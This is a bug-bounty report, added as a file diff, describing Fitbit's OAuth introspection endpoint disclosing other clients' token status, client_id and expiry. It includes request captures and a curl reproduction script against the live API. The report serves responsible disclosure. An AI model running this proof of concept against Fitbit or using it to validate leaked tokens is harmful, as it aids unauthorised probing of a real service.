@@ -1,0 +1,126 @@
+# G-F002 — Fitbit's token introspection endpoint does not bind tokens to the requesting client
+
+**Program:** Google and Alphabet VRP · **Target:** `api.fitbit.com/1.1/oauth2/introspect`
+**Found:** 2026-10-08 · **Tester IP:** 180.148.212.54 · curl 8.21.0 (aarch64-android)
+**Status:** verified, impact partially bounded
+
+---
+
+## The finding in one line
+
+An OAuth client can introspect an access token that was issued to a **different** client, and Fitbit
+tells it the token is active, which client it belongs to, and when it expires.
+
+## Why this is independent of G-F001
+
+G-F001 is about two client secrets being published. This is not. **Any party holding credentials for
+two Fitbit OAuth applications can reproduce this**, and until recently anyone could register them
+freely at `dev.fitbit.com/apps/new`. The published secrets are how *I* happened to have two sets of
+credentials; they are not a precondition of the flaw.
+
+That makes this the broader issue: it affects every client on the platform, not two.
+
+## Proof
+
+Two application tokens were minted, one per client, each via `client_credentials` with that client's
+own credentials. Then client `228TQD` was asked to introspect the token belonging to `227ZG3`.
+
+```
+[CONTROL]  228TQD introspects its OWN token
+           200 {"active":true,"scope":"{}","client_id":"228TQD","token_type":"access_token",
+                "exp":1791468533000,"iat":1791439733000}
+
+[CROSS]    228TQD introspects 227ZG3's token
+           200 {"active":true,"scope":"{}","client_id":"227ZG3","token_type":"access_token",
+                "exp":1791468531000,"iat":1791439731000}
+                                ^^^^^^^^ a DIFFERENT client, and Fitbit names it in the reply
+
+[SENTINEL] 228TQD introspects a fabricated token
+           200 {"active":false}
+```
+
+The control proves the endpoint works for a client's own token. The sentinel proves it genuinely
+validates tokens rather than answering `active:true` to anything. Between them, the cross result is
+real: **Fitbit knew the token belonged to `227ZG3`, said so, and answered anyway.**
+
+## Fitbit enforces this binding elsewhere, which is what makes it look like an oversight
+
+The same experiment against the revocation endpoint is refused:
+
+```
+[CROSS] 228TQD revokes 227ZG3's token
+        403 {"errorType":"insufficient_permissions",
+             "message":"API client is not authorized by the resource owner to access the resource requested."}
+
+verify: 227ZG3 introspects its own token afterwards
+        200 {"active":true, ...}        <- the token survived
+```
+
+A `200` from a revocation endpoint would have meant nothing on its own — RFC 7009 has them return
+`200` for unknown tokens — so the verification line is what settles it. The token was untouched.
+
+**So Fitbit has the concept of client-token binding and enforces it on `revoke`, but not on
+`introspect`.** That inconsistency is hard to explain as intended design, and it is the strongest
+argument in this report.
+
+Fitbit's own authorization guide documents neither endpoint, so there is no published statement that
+cross-client introspection is expected.
+
+## What an attacker gets, stated exactly
+
+With a token string belonging to another application, a client learns:
+
+```
+whether the token is live          active:true/false
+which application it belongs to    client_id
+its validity window                iat / exp
+its granted scopes                 scope
+```
+
+Tokens leak in referrer headers, server logs, crash reports, browser history and shared devices. An
+attacker holding a leaked string currently cannot tell whether it is worth anything. This endpoint
+tells them — for free, from any client, including one they registered themselves.
+
+## The limit I could not pass
+
+Both tokens tested were **application** tokens, whose `scope` is empty. Introspection of a **user**
+token normally also returns the user id and the real granted scopes, which would make this a
+disclosure about a named person rather than about an app token's expiry.
+
+I could not test that. Minting a user token needs `grant_type=password`, and the Fitbit accounts I
+can create use Google sign-in and have no native Fitbit password — confirmed by attempting it and
+receiving `Invalid username/password`. New app registration is also closed
+(`dev.fitbit.com/apps/new` has its fields disabled), so I could not approach it from a second app
+either.
+
+**This is a limit, not a negative result.** Whether cross-client introspection of a user token
+discloses the user id and scopes is something Fitbit can check internally in seconds, and if it does,
+the severity is higher than what I demonstrated.
+
+## Remediation
+
+Scope the introspection response to the requesting client: return `active:false`, or an error, when
+the token was issued to a different `client_id` — the behaviour already implemented on `revoke`.
+
+## Reproduction
+
+```bash
+A=$(printf '<clientA_id>:<clientA_secret>' | base64 -w0)
+B=$(printf '<clientB_id>:<clientB_secret>' | base64 -w0)
+
+TOKEN_A=$(curl -s -X POST https://api.fitbit.com/oauth2/token -H "Authorization: Basic $A" \
+  -d 'grant_type=client_credentials' | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
+
+# client B reads client A's token
+curl -s -X POST https://api.fitbit.com/1.1/oauth2/introspect -H "Authorization: Basic $B" \
+  --data-urlencode "token=$TOKEN_A"
+```
+
+## Honest outcome estimate, recorded before the result
+
+| Outcome | Estimate | Why |
+|---|---|---|
+| Accepted, low severity | ~40% | A genuine cross-client authorization flaw with control and sentinel, but what leaks from an app token is thin. |
+| Informational | ~30% | "No sensitive data disclosed" is a fair reading of the app-token case. |
+| Duplicate | ~20% | Two client credentials used to be free to obtain, so others could have tried this. |
+| Accepted, medium | ~10% | Only if user-token introspection leaks the user id, which I could not test and do not claim. |
